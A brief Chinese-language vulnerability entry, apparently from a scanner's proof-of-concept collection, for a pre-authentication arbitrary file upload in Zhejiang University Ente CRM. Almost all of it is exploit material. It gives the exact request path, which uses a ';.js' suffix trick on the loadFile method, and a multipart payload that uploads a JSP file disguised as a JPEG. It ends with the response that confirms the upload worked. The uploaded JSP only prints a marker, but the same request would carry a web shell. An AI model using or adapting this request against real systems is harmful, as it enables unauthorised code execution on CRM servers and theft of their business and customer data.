# 浙大恩特CRM全版本前台任意文件上传

浙大恩特CRM全版本前台 ｜ 文件上传 ｜ —
- **请求**：`POST /entsoft/CustomerAction.entphone;.js?method=loadFile HTTP/1.1`

**Payload**
```
------WebKitFormBoundarye8FPHsIAq9JN8j2A
Content-Disposition: form-data; name="file";filename="dudesuite.jsp"
Content-Type: image/jpeg
<%out.print("dudesuite");%>
------WebKitFormBoundarye8FPHsIAq9JN8j2A--
```
- **响应特征**：200 dudesuite.jsp